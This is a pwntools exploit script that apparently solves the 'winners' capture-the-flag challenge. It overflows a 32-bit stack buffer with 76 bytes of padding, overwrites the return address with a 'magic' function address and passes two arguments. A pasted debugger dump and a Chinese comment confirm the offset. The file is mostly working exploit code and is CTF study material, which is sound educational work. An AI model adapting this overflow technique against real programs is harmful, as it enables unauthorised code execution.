# -*- coding:utf-8 -*-

from pwn import *

context(log_level = "debug")

p=process('./winners')
#p=remote('chals20.cybercastors.com', 14434)
#magic_addr = 0x080491CF 
magic_addr = 0x08049196

#raw_input()
# 这里要注意一下offset是76而不是80
'''
 EIP  0x61616174 ('taaa')
 ─────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
 Invalid address 0x61616174










 ─────────────────────────────────────────[ STACK ]──────────────────────────────────────────
 00:0000│ esp  0xffffd2d0 ◂— 0x61616175 ('uaaa')


'''
payload ='a'*76
#payload ='a'*80
payload += p32(magic_addr)
payload += p32(0x182)
payload += p32(0x182)


p.recvuntil('I\'ll give you one shot at it, what floor is the table at: \n')
p.sendline(payload)
#gdb.attach(p, "b main")
p.recv()

p.interactive()

